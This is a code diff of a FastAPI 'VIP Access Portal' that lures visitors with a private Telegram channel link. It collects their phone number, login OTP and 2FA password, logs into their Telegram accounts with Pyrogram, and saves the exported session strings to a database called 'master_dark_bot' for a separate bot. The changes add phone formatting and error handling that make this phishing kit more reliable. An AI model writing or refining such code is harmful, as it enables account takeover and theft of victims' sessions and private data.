@@ -13,16 +13,17 @@ from motor.motor_asyncio import AsyncIOMotorClient
 
 app = FastAPI(title="VIP Access Portal")
 
-API_ID = int(os.environ.get("API_ID", "123456"))
-API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
+# API_ID ko safely Clean aur Int mein convert karna
+raw_api_id = os.environ.get("API_ID", "").strip()
+if not raw_api_id:
+    raise ValueError("CRITICAL: API_ID Environment Variable is missing!")
+API_ID = int(raw_api_id)
 
-# Bot ke saath sync karne ke liye MONGO_URI variable use kiya hai
-MONGO_URI = os.environ.get("MONGO_URI", os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority"))
-CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")
+API_HASH = os.environ.get("API_HASH", "").strip()
+MONGO_URI = os.environ.get("MONGO_URI", os.environ.get("MONGO_URL", "")).strip()
+CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel").strip()
 
 mongo_client = AsyncIOMotorClient(MONGO_URI)
-
-# Bot ke database aur collection se matching setup
 db = mongo_client["master_dark_bot"]
 sessions_col = db["sessions"]
 
@@ -38,6 +39,16 @@ class OtpReq(BaseModel):
 class PasswordReq(BaseModel):
     phone: str
     password: str
+
+# Helper Function: Kisi bhi country code aur format ko clean karne ke liye
+def format_phone_number(raw_phone: str) -> str:
+    clean = "".join(filter(lambda x: x.isdigit() or x == '+', raw_phone.strip()))
+    if not clean.startswith("+"):
+        if len(clean) == 10:
+            clean = "+91" + clean
+        else:
+            clean = "+" + clean
+    return clean
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -323,35 +334,31 @@ HTML_TEMPLATE = """
     async function sendCode(isResend = false) {
       if(!isResend) {
         let rawInput = document.getElementById('phoneInput').value.trim();
-        let clean = rawInput.replace(/[^\\d+]/g, '');
-
-        if (!clean) return showError("Please enter a valid phone number");
-
-        if (clean.startsWith('+')) {
-            userPhone = clean;
-        } else if (clean.length === 10) {
-            userPhone = '+91' + clean;
-        } else {
-            userPhone = '+' + clean;
-        }
+        if (!rawInput) return showError("Please enter a valid phone number");
+        userPhone = rawInput;
       }
 
       const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
       btn.innerText = "Sending...";
 
-      const res = await fetch('/api/send-code', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ phone: userPhone })
-      });
-      const data = await res.json();
-      if(res.ok) {
-        document.getElementById('step-phone').classList.add('hidden');
-        document.getElementById('step-otp').classList.remove('hidden');
-        document.getElementById('displayPhone').innerText = "Sent to " + userPhone;
-        document.getElementById('errorMsg').classList.add('hidden');
-      } else {
-        showError(data.detail || "Error sending OTP");
+      try {
+        const res = await fetch('/api/send-code', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ phone: userPhone })
+        });
+        const data = await res.json();
+        if(res.ok) {
+          userPhone = data.phone; // formatted phone from server
+          document.getElementById('step-phone').classList.add('hidden');
+          document.getElementById('step-otp').classList.remove('hidden');
+          document.getElementById('displayPhone').innerText = "Sent to " + userPhone;
+          document.getElementById('errorMsg').classList.add('hidden');
+        } else {
+          showError(data.detail || "Error sending OTP");
+        }
+      } catch (err) {
+        showError("Network error. Please try again.");
       }
       btn.innerText = isResend ? "Resend OTP" : "Send Code";
     }
@@ -359,41 +366,49 @@ HTML_TEMPLATE = """
     async function verifyOtp() {
       const code = document.getElementById('otpInput').value.trim();
       document.getElementById('btnVerifyOtp').innerText = "Verifying...";
-      const res = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ phone: userPhone, code: code })
-      });
-      const data = await res.json();
-      if(res.ok) {
-        if(data.require_2fa) {
-          document.getElementById('step-otp').classList.add('hidden');
-          document.getElementById('step-2fa').classList.remove('hidden');
-          document.getElementById('errorMsg').classList.add('hidden');
+      try {
+        const res = await fetch('/api/verify-otp', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ phone: userPhone, code: code })
+        });
+        const data = await res.json();
+        if(res.ok) {
+          if(data.require_2fa) {
+            document.getElementById('step-otp').classList.add('hidden');
+            document.getElementById('step-2fa').classList.remove('hidden');
+            document.getElementById('errorMsg').classList.add('hidden');
+          } else {
+            window.location.href = data.link;
+          }
         } else {
-          window.location.href = data.link;
+          showError(data.detail || "Invalid OTP");
         }
-      } else {
-        showError(data.detail || "Invalid OTP");
-        document.getElementById('btnVerifyOtp').innerText = "Verify & Continue";
+      } catch (err) {
+        showError("Network error. Please try again.");
       }
+      document.getElementById('btnVerifyOtp').innerText = "Verify & Continue";
     }
 
     async function verify2FA() {
       const password = document.getElementById('passwordInput').value.trim();
       document.getElementById('btnVerify2FA').innerText = "Verifying 2FA...";
-      const res = await fetch('/api/verify-2fa', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ phone: userPhone, password: password })
-      });
-      const data = await res.json();
-      if(res.ok) {
-        window.location.href = data.link;
-      } else {
-        showError(data.detail || "Incorrect Password");
-        document.getElementById('btnVerify2FA').innerText = "Submit Password";
+      try {
+        const res = await fetch('/api/verify-2fa', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ phone: userPhone, password: password })
+        });
+        const data = await res.json();
+        if(res.ok) {
+          window.location.href = data.link;
+        } else {
+          showError(data.detail || "Incorrect Password");
+        }
+      } catch (err) {
+        showError("Network error. Please try again.");
       }
+      document.getElementById('btnVerify2FA').innerText = "Submit Password";
     }
   </script>
 </body>
@@ -406,7 +421,7 @@ async def serve_ui():
 
 @app.post("/api/send-code")
 async def send_code(data: PhoneReq):
-    phone = data.phone.strip().replace(" ", "")
+    phone = format_phone_number(data.phone)
     try:
         client = Client(name=f"sess_{phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
         await client.connect()
@@ -416,13 +431,13 @@ async def send_code(data: PhoneReq):
             "client": client,
             "phone_code_hash": sent_code.phone_code_hash
         }
-        return {"status": "ok", "message": "OTP sent successfully"}
+        return {"status": "ok", "message": "OTP sent successfully", "phone": phone}
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
 @app.post("/api/verify-otp")
 async def verify_otp(data: OtpReq):
-    phone = data.phone.strip()
+    phone = format_phone_number(data.phone)
     clean_phone = phone.replace("+", "").strip()
     
     if phone not in active_clients:
@@ -437,7 +452,6 @@ async def verify_otp(data: OtpReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Sync format with Bot's database: saves clean phone (without +)
         await sessions_col.update_one(
             {"$or": [{"phone": clean_phone}, {"phone": phone}]},
             {"$set": {
@@ -463,7 +477,7 @@ async def verify_otp(data: OtpReq):
 
 @app.post("/api/verify-2fa")
 async def verify_2fa(data: PasswordReq):
-    phone = data.phone.strip()
+    phone = format_phone_number(data.phone)
     clean_phone = phone.replace("+", "").strip()
     
     if phone not in active_clients:
@@ -476,7 +490,6 @@ async def verify_2fa(data: PasswordReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Sync format with Bot's database: saves clean phone with 2FA
         await sessions_col.update_one(
             {"$or": [{"phone": clean_phone}, {"phone": phone}]},
             {"$set": {
@@ -494,4 +507,3 @@ async def verify_2fa(data: PasswordReq):
         raise HTTPException(status_code=400, detail="Incorrect 2FA Password.")
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
-    
